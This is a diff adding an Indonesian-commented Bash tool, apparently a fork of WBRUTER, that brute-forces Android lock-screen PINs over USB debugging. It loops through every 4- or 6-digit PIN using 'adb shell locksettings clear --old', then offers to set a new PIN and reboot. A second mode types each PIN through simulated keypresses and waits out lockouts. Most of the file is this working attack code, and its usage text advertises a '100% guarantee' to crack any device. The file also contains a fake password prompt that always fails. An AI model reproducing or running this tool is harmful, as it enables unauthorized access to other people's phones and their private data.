@@ -1,0 +1,507 @@
+#!/bin/bash
+################################################################################
+################################################################################
+####                                                                       #####
+####  Pemberitahuan untuk semua BANG JAGO.                                 #####
+####  Jika Anda menyalin karya nyata pengembang, itu tidak akan menjadikan ##### 
+####  Anda seorang HACKERL. Resepect semua pengembang, kami melakukan ini  #####
+####  karena menyenangkan!                                                 #####
+####                                                                       #####
+################################################################################
+################################ SOURCE CODE ###################################
+################################################################################
+########################### CPA BY BENYAMINXPLOIT ##############################
+####                                                                       #####
+####  WBRUTER - Alat brute force untuk menyerang berbagai akun dan         #####
+####            perangkat yang telah ditulis dalam kode bash murni         #####
+####                                                                       #####
+####  Copyright (C) 2019-2020, Benyaminxploit                              #####
+####                                                                       #####
+####  Program ini adalah perangkat lunak gratis; Anda dapat mendistribusi  #####
+####  kannya kembali dan / atau memodifikasi                               #####
+####  di bawah persyaratan Lisensi Publik Umum GNU yang diterbitkan oleh   #####
+####  Free Software Foundation; baik versi 2 dari Lisensi, atau            #####
+####  (sesuai pilihan Anda) versi yang lebih baru.                         #####
+####                                                                       #####
+####  Program ini disebarkan dengan harapan bermanfaat,                    #####
+####  tetapi TANPA JAMINAN APA PUN; bahkan tanpa jaminan tersirat dari     #####
+####  DIPERDAGANGKAN atau KESESUAIAN UNTUK TUJUAN TERTENTU. Lihat          #####
+####  Lisensi Publik Umum GNU untuk detail selengkapnya.                   #####
+####                                                                       #####
+####                                                                       #####
+####  Contact:                                                             #####
+####          IG      : benyamin @benyaminxploit                           #####
+####          whatsapp: 08115932727                                        #####
+####                                                                       #####
+################################################################################
+####                                                                       #####
+####  Alat open source pertama yang dapat menjamin pengguna merusak        #####
+####  androi kode pin selama mode debugging diaktifkan - Dirilis: 2k18     #####
+####                                                                       #####
+################################################################################
+################################################################################
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Di bawah ini kami menyimpan VERSION dari CPA...........................####
+####                                                                        ####
+################################################################################
+################################################################################
+VERSION=v0.1.1
+RELEASEDATE="2020-10-??"
+Copyright=Benyaminxploit
+################################################################################
+################################################################################
+####                                                                        ####
+#### Di sini kami menyimpan warna dalam variabel agar lebih mudah digunakan ####
+#### di bagian bantuan                                                      ####
+####                                                                        ####
+################################################################################
+################################################################################
+RED="\e[0;31m"
+BRIGHTRED="\e[1;31m"
+BLUE="\e[0;34m"
+BRIGHTBLUE="\e[1;34m"
+MAGENTA="\e[0;35m"
+BRIGHTMAGENTA="\e[1;35m"
+GREEN="\e[0;32m"
+BRIGHTGREEN="\e[1;32m"
+YELLOW="\e[0;33m"
+BRIGHTYELLOW="\e[1;33m"
+CYAN="\e[0;36m"
+BRIGHTCYAN="\e[1;36m"
+WHITE="\e[0;37m"
+BRIGHTWHITE="\e[1;37m"
+GRAY="\e[0;233m"
+BRIGHTGRAY="\e[1;233m"
+END="\e[0m"
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Fungsi ini akan memeriksa sehingga debugging usb telah diaktifkan......####
+####                                                                        ####
+################################################################################
+################################################################################
+androiddebug() {
+case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in
+    "unauthorized") echo "* You must enable usb-debugging in developer settings." ;;
+esac
+}
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Ini akan memeriksa perangkat mode runmode mana yang telah di-boot......####
+#### Karena kita harus memisahkan semuanya, untuk bruteforce kita ingin     ####
+#### normal.................................................................####
+#### mode boot, jika perangkat tidak dalam mode normal kami berhenti .......####
+####                                                                        ####
+################################################################################
+################################################################################
+android_status() {
+ADBW=$(adb devices | sed -n '2p'|awk '{print $2}' | sed 's/device/normal/g')
+ADBF="$(fastboot devices | grep fastboot|awk '{print $2}')"
+ADBOFF="$(adb devices | sed -n 2p)"
+if [[ $ADBW = "normal" ]]; then
+    echo "normal" > $(pwd)/.wdroid-status
+elif [[ $ADBW = "unauthorized" ]]; then
+    echo " * Please allow this pc to authorize" > $(pwd)/.wdroid-status
+elif [[ $ADBW = "recovery" ]]; then
+    echo "recovery" > $(pwd)/.wdroid-status
+elif [[ $ADBF = "fastboot" ]]; then
+    echo "fastboot" > $(pwd)/.wdroid-status
+else
+    echo "* No device connected.."
+exit
+fi
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Selain kontrol lain, periksa apakah perangkat telah diotorisasi dengan ####
+#### PC ini.................................................................####
+####                                                                        ####
+################################################################################
+################################################################################
+adb devices |sed -n 2p|grep una &> /dev/null
+if [[ $? -eq "0" ]]; then
+   echo "* Your device has not been authorized with this pc, aborted."
+   exit
+fi
+
+}
+
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Kontrol ketiga, periksa agar alat yang diperlukan diinstal pada PC.....####
+####                                                                        ####
+################################################################################
+################################################################################
+adbexist() {
+adb="$(which adb 2> /dev/null)"
+distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"
+
+if [ -z "$adb" ]; then
+   printf "+ You must install \e[1;1madb\e[0m package before you can attack by this method.\n" 
+  read -p "Install adb (Y/n) " adbinstall
+fi
+
+case $adbinstall in
+     "Y")
+        echo -e "\nPlease wait..\n"
+      sleep 1
+case $distro in
+     "Gentoo")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        emerge --ask android-tools ;;
+     "Sabayon")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        emerge --ask android-tools ;;
+     "Ubuntu")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "Debian")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "Raspbian")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "Mint")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "no") echo "Aborted." ;
+           exit 0 ;;
+esac
+       echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
+esac
+}
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### kontrol keempat, jika ada lebih dari dua perangkat yang terhubung......####
+#### maka kita akan membiarkan pengguna memilih mana yang akan diserang.....####
+####                                                                        ####
+################################################################################
+################################################################################
+multidevices() {
+ADBTOT="$(adb devices | sed 1d|head -2|grep device|wc -l)"
+
+if [[ $ADBTOT -gt "1" ]]; then
+    echo "You have more then one device connected, please choose one of:" 
+#    echo $(adb devices| awk '{print NR-1 " - " $0}'|sed "1d;$d"|awk '{print $1 ")", $3}'|sed '$d';) 
+    exit 1
+fi
+}
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Jika pengguna akan menggunakan --android atau -a tanpa digit, lalu     ####
+#### cetak penggunaan.......................................................####
+####                                                                        ####
+################################################################################
+################################################################################
+android_usage() {
+if [[ -z $1 ]];then
+   STATUS=$(cat $(pwd)/.wdroid-status)
+   rm $(pwd)/.wdroid-status
+if [[ $STATUS = "normal" ]]; then
+   printf "\nDevice is in $STATUS mode, what are you trying to do?
+
+     Usage:
+
+        ./CPA --android 4         # Attack android device via locksettings protected by 4 digits
+        ./CPA --android 6         # Attack android device via locksettings protected by 6 digits
+        ./CPA --android-gui 4     # Attack android device pin code via gui-screen protected by 4 digits
+        ./CPA --android-gui 6     # Attack android device pin code via gui-screen protected by 6 digits
+
+"
+   exit 1
+fi
+else
+printf "Your device must be in normal mode when attacking pin code\n"
+fi
+}
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Ini adalah bruteforcer untuk android dengan 4digits melalui            ####
+#### locksettings...........................................................####
+####                                                                        ####
+################################################################################
+################################################################################
+android4() {
+cr=`echo $'\n.'`
+cr=${cr%.}
+    printf "%52s\n" | tr ' ' '-'
+    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+    printf "%52s\n" | tr ' ' '-'
+for i in {0000..9999}; do
+if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
+    printf "Wrong PIN: \e[1;31m$i\e[0m\n"
+else
+    printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
+    printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
+case $newpin in
+   y)
+    read -p "Pin: " newpin2
+    adb shell locksettings set-pin $newpin2
+    printf "\nIt is required to restart your device after\n"
+    printf "PIN code has been set after old pin was erased..\n\n"
+    ;;
+   N)
+    printf "\nIt is required to restart your device after\n"
+    printf "PIN code has been erased from your device..\n\n";
+    ;;
+esac
+    read -p "restart device (y/N): " rebootornot
+case $rebootornot in
+    y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
+    N) printf "\nPin was cracked by CPA v1.5\n\n";exit 0 ;;
+esac
+    exit
+fi
+done
+}
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Ini adalah bruteforcer untuk 6 digit melalui pengaturan kunci .........####
+####                                                                        ####
+################################################################################
+################################################################################
+android6() {
+cr=`echo $'\n.'`
+cr=${cr%.}
+    printf "%52s\n" | tr ' ' '-'
+    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+    printf "%52s\n" | tr ' ' '-'
+for i in {000000..999999}; do
+if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
+    printf "Wrong PIN: \e[1;31m$i\e[0m\n"
+else
+    printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
+    printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
+case $newpin in
+   y)
+    read -p "Pin: " newpin2
+    adb shell locksettings set-pin $newpin2
+    printf "\nIt is required to restart your device after\n"
+    printf "PIN code has been set after old pin was erased..\n\n"
+    ;;
+   N)
+    printf "\nIt is required to restart your device after\n"
+    printf "PIN code has been erased from your device..\n\n";
+    ;;
+esac
+    read -p "restart device (y/N): " rebootornot
+case $rebootornot in
+    y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
+    N) printf "\nPin was cracked by CPA v1.5\n\n";exit 0 ;;
+esac
+    exit
+fi
+done
+}
+
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Ini adalah bruteforcer untuk android dengan 4 digit melalui Layar GUI  ####
+####                                                                        ####
+################################################################################
+################################################################################
+androidgui4() {
+screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
+case $screen in
+ "mScreenState=OFF") echo -e "Preparing to attack."; 
+                     echo -e "All Has Been Set" ;;
+ "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+esac
+   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+for i in {0000..9999}; do
+   echo -e "\e[0;1mTrying pin:  $i\e[0m"
+for (( j=0; j<${#i}; j++ )); do
+   adb shell input keyevent $((`echo ${i:$j:1}`+7))
+done
+   adb shell input keyevent 66
+   adb shell input swipe 407 1211 378 85
+clear() {
+   adb shell input keyevent KEYCODE_MOVE_END
+   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+if ! (( `expr $i + 1` % 4 )); then
+   adb shell input keyevent 66
+   sleep 30
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+fi
+done
+}
+
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Ini adalah bruteforcer untuk android dengan 6 digit melalui Layar GUI  ####
+####                                                                        ####
+################################################################################
+################################################################################
+androidgui6() {
+screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
+case $screen in
+ "mScreenState=OFF") echo -e "Preparing to attack."; 
+                     echo -e "All Has Been Set" ;;
+ "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+esac
+   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+for i in {000000..999999}; do
+   echo -e "\e[0;1mTrying pin:  $i\e[0m"
+for (( j=0; j<${#i}; j++ )); do
+   adb shell input keyevent $((`echo ${i:$j:1}`+7))
+done
+   adb shell input keyevent 66
+   adb shell input swipe 407 1211 378 85
+clear() {
+   adb shell input keyevent KEYCODE_MOVE_END
+   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+if ! (( `expr $i + 1` % 4 )); then
+   adb shell input keyevent 66
+   sleep 30
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+fi
+done
+}
+
+################################################################################
+################################################################################
+####                                                                        ####
+#### Dari sini kita membaca stdin dari pengguna sehingga kita dapat         ####
+#### memanggil fungsi benar, jika tidak ada variabel yang digunakan maka    ####
+#### kita akan mencetak bantuan ............................................####
+####                                                                        ####
+################################################################################
+################################################################################
+
+if [[ $1 = "--android" && $2 = "4" ]] || [[ $1 = "-a" && $2 = "4" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    android4
+elif [[ $1 = "--android" && $2 = "6" ]] || [[ $1 = "-a" && $2 = "6" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    android6
+elif [[ $1 = "--android-gui" && $2 = "4" ]] || [[ $1 = "-A" && $2 = "4" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    androidgui4
+elif [[ $1 = "--android-gui" && $2 = "6" ]] || [[ $1 = "-A" && $2 = "6" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    androidgui6
+elif [[ $1 = "--android" && ! $2 = "4" ]] || [[ $1 = "-a" && ! $2 = "4" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    android_usage
+elif [[ $1 = "--android" && ! $2 = "6" ]] || [[ $1 = "-a" && ! $2 = "6" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    android_usage
+elif [[ $1 = "--android-gui" && ! $2 = "4" ]] || [[ $1 = "-A" && ! $2 = "4" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    android_usage
+elif [[ $1 = "--android-gui" && ! $2 = "6" ]] || [[ $1 = "-A" && ! $2 = "6" ]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    android_usage
+elif [[ $1 = "-v" || $1 = "-version" || $1 = "--version" || $1 = "--v" ]]; then
+     printf "\nini rilis pada $RELEASEDATE dan dibuat oleh $Copyright\n"
+     printf "\nkamu menggunakan $basename$0 $VERSION kalo kamu menemukan error, sintak tidak jalan beri tau kami terimakasih\n"
+else
+
+if [[ $* = "-n" ]]; then
+
+printf "
+
+  $basename$0 $VERSION - is a tool for using brute force & dictionary attacking methods to attack various stuff written in \e[1;1mpure\e[0m bash code
+
+       ______________ ______/ /__   ____  (_)___ 
+      / ___/ ___/ __ `/ ___/ //_/  / __ \/ / __ \
+     / /__/ /  / /_/ / /__/ ,<    / /_/ / / / / /
+     \___/_/   \__,_/\___/_/|_|  / .___/_/_/ /_/ 
+                                /_/              
+        di buat oleh benyaminxploit
+        BXP Team crew mate
+                        __           _     __
+       ____ _____  ____/ /________  (_)___/ /
+      / __ `/ __ \/ __  / ___/ __ \/ / __  / 
+     / /_/ / / / / /_/ / /  / /_/ / / /_/ /  
+     \__,_/_/ /_/\__,_/_/   \____/_/\__,_/   
+
+      --android [4] [6] [wordfile]   - Brute force attack any android device with 100% guarantee to crack pin via locksettings
+      --android-gui [4] [6]           - Brute force attack any android device via gui/login screen
+      --version                      - Print version of $basename$0
+
+"
+else
+
+echo "                       by benyaminxploit & team              "
+sleep 0.15
+echo "                  FOLLOW MY INSTAGRAM @Bnyaminxploit         "
+sleep 0.15
+echo "             brute force attack pin android (debugging usb)  "
+sleep 5
+echo selamat datang, apa password untuk code ini? #tulisan keluar
+read password #membaca yang ditulis
+sleep 3
+echo "$password" password salah!!!
+sleep 30
+##################################################################################
+##################################################################################
+######################  jangan mudah untuk di bodohi #############################
+################## terima kasih sudah menggunakan tols ini #######################
+##################################################################################
+########################## benyaminxploit and team ###############################
+##################################################################################
+##################################################################################
+printf "
+     
+
+  $basename$0 $VERSION - is a tool for using brute force & dictionary attacking methods to attack various stuff written in \e[1;1mpure\e[0m bash code
+
+     $BRIGHTBLUE--android [4] [6] [wordfile]   - Brute force attack any android device with 100% guarantee to crack pin via locksettings
+     $BRIGHTMAGENTA--android-gui [4] [6]        - Brute force attack any android device via gui/login screen
+     $BRIGHTRED--version                      - Print version of $basename$0 
+     $CYAN contoh $basename$0 --methods
+"
+fi
+fi
